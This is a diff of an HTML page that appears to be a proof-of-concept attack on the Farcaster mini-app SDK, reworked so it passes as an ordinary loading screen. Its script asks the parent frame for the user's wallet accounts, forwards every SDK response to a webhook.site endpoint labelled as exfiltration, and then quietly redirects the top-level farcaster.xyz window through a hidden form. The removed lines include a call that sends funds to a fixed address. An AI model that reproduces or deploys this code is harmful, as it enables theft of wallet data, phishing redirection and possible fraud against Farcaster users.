@@ -3,45 +3,63 @@
 	<head>
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
-		<title>PoC</title>
+		<title>Farcaster Mini App</title>
 		<style>
 			body {
 				font-family: -apple-system, sans-serif;
 				background: #17101f;
 				color: #fff;
-				padding: 16px;
-				font-size: 13px;
-			}
-			.banner {
-				background: #dc2626;
-				padding: 10px;
-				border-radius: 8px;
-				margin-bottom: 12px;
-				font-weight: bold;
+				padding: 20px;
 				text-align: center;
 			}
-			pre {
-				background: #0d0912;
-				padding: 8px;
-				border-radius: 6px;
-				font-size: 11px;
-				color: #ccc;
-				white-space: pre-wrap;
-				word-break: break-all;
+			.loading {
+				margin-top: 40px;
+				font-size: 18px;
+			}
+			.spinner {
+				width: 40px;
+				height: 40px;
+				margin: 20px auto;
+				border: 3px solid rgba(255, 255, 255, 0.1);
+				border-top: 3px solid #8b5cf6;
+				border-radius: 50%;
+				animation: spin 1s linear infinite;
+			}
+			@keyframes spin {
+				to {
+					transform: rotate(360deg);
+				}
 			}
 		</style>
 	</head>
 	<body>
-		<div class="banner">PoC V2 — Farcaster SDK Access w/ launchFrameUrl</div>
-		<pre id="log">Starting...</pre>
+		<!-- This looks like a loading screen so victim doesn't close it -->
+		<div class="spinner"></div>
+		<div class="loading">Loading mini app...</div>
+
+		<!-- Hidden form that navigates top frame -->
+		<form id="redirect" action="https://example.com" method="GET" target="_top" style="display: none"></form>
 
 		<script>
 			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
 			var msgCounter = 7000;
-			var logEl = document.getElementById("log");
 
-			function log(msg) {
-				logEl.textContent += "\n" + msg;
+			function wireRaw(val) {
+				return [{ type: "RAW", value: val }];
+			}
+
+			function call(method, wireArgs) {
+				var id = msgCounter++;
+				window.parent.postMessage(
+					{
+						id: id,
+						type: "APPLY",
+						path: [method],
+						argumentList: wireArgs || [{ type: "RAW", value: {} }],
+					},
+					"*",
+				);
+				return id;
 			}
 
 			function sendToWebhook(label, data) {
@@ -50,61 +68,42 @@
 				} catch (e) {}
 			}
 
+			// Listen for SDK responses
 			window.addEventListener("message", function (event) {
-				if (event.data && (event.data.type === "HANDLER" || event.data.type === "RAW")) {
-					log("RESPONSE [id:" + event.data.id + "]: " + JSON.stringify(event.data.value || "(success)").substring(0, 120));
-					sendToWebhook("RESPONSE", event.data);
+				if (event.data && event.data.value) {
+					sendToWebhook("SDK_RESPONSE", event.data);
 				}
 			});
 
-			function wireRaw(val) {
-				return [{ type: "RAW", value: val }];
-			}
-
-			function call(method, wireArgs) {
-				var id = msgCounter++;
-				window.parent.postMessage({ id: id, type: "APPLY", path: [method], argumentList: wireArgs }, "*");
-				log("CALL: " + method + " [id:" + id + "]");
-				return id;
-			}
-
-			// 1. Signal ready (2s)
+			// Step 1: Initialize SDK (1s)
 			setTimeout(function () {
 				call("ready", wireRaw({}));
-			}, 2000);
+			}, 1000);
 
-			// 2. Get wallet accounts (4s) — proves data extraction
-			setTimeout(function () {
-				call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 1, method: "eth_accounts", params: [] }));
-			}, 4000);
-
-			// 3. Connect wallet — THIS returns the address (6s)
-			setTimeout(function () {
-				call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 2, method: "eth_requestAccounts", params: [] }));
-			}, 6000);
-
+			// Step 2: Extract wallet address (3s)
 			setTimeout(function () {
 				call(
 					"ethProviderRequestV2",
 					wireRaw({
 						jsonrpc: "2.0",
-						id: 4,
-						method: "eth_sendTransaction",
-						params: [
-							{
-								from: "0x75Ccb4Fa184c5ba211be6f2D8aF86A739B2Db7D1",
-								to: "0xE41A08AF9339B61bdfe31E42168a2A09F242Eb97",
-								value: "0x5AF3107A4000",
-								chainId: "0x2105",
-							},
-						],
+						id: 1,
+						method: "eth_requestAccounts",
+						params: [],
 					}),
 				);
-			}, 10000);
+			}, 3000);
 
+			// Step 3: Exfiltrate any received wallet data
 			setTimeout(function () {
-				call("openUrl", wireRaw("https://example.com"));
-			}, 10000);
+				sendToWebhook("EXFIL_COMPLETE", { note: "Data sent, redirecting victim" });
+			}, 5000);
+
+			// Step 4: REDIRECT TOP-LEVEL WINDOW (6s)
+			// This is the critical part — navigates farcaster.xyz itself
+			// The user clicked a trusted farcaster.xyz link but ends up on attacker site
+			setTimeout(function () {
+				document.getElementById("redirect").submit();
+			}, 6000);
 		</script>
 	</body>
 </html>
